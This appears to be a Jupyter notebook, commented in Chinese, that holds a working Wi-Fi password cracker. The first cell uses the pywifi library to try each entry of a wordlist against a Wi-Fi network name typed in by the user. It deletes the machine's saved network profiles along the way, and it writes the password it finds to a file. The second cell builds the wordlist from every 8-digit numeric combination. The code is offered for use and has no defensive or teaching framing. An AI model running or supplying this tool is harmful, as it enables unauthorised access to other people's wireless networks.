{
 "nbformat": 4,
 "nbformat_minor": 2,
 "metadata": {
  "language_info": {
   "name": "python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   }
  },
  "orig_nbformat": 2,
  "file_extension": ".py",
  "mimetype": "text/x-python",
  "name": "python",
  "npconvert_exporter": "python",
  "pygments_lexer": "ipython3",
  "version": 3
 },
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "from pywifi import const # 引入一个常量\n",
    "import time\n",
    "\n",
    "def wifiConnect(wifiname,wifipassword):\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    ifaces = wifi.interfaces()[0]\n",
    "    ifaces.disconnect()# 断开连接\n",
    "    time.sleep(0.5)\n",
    "    if ifaces.status() == const.IFACE_DISCONNECTED:\n",
    "        profile = pywifi.Profile()# 创建WiFi连接文件\n",
    "        profile.ssid = wifiname# WiFi的ssid，即wifi的名称\n",
    "        profile.key = wifipassword# WiFi密码\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk\n",
    "        profile.auth = const.AUTH_ALG_OPEN # 开放网卡\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP# 加密单元\n",
    "        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件\n",
    "        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件\n",
    "        ifaces.connect(tep_profile) # 连接WiFi\n",
    "        time.sleep(1.5)\n",
    "        if ifaces.status() == const.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "def main():\n",
    "    print('开始破解：')\n",
    "    file = open('8位密码本.txt','r')#打开密码本\n",
    "    wifi_name=input('请输入所要破解的wifi的名字（请务必注意大小写）：')\n",
    "    while True:\n",
    "        wifipwd = file.readline()\n",
    "        try:\n",
    "            bool = wifiConnect(wifi_name,wifipwd)\n",
    "            if bool:\n",
    "                print('正确密码为：'+wifipwd)\n",
    "                fo=open('D:/wifikey/%s.txt'%wifi_name,'w')\n",
    "                fo.write('该wifi的密码为：')\n",
    "                fo.write(wifipwd)\n",
    "                fo.close()\n",
    "                break\n",
    "            else:\n",
    "               print('本次尝试的密码为：%s，状态：密码错误'%wifipwd)\n",
    "        except:\n",
    "            continue\n",
    "    file.close()\n",
    "if __name__=='__main__':\n",
    "\tmain()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import itertools as its\n",
    "words_num = \"1234567890\"\n",
    "words_letter = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n",
    "r = its.product(words_num, repeat=8)#以建8位纯数字密码本为例：\n",
    "fo = open(\"8位密码本.txt\", \"w\")\n",
    "for i in r:\n",
    "\tfo.write(\"\".join(i))\n",
    "\tfo.write(\"\".join(\"\\n\"))\n",
    "fo.close()\n"
   ]
  }
 ]
}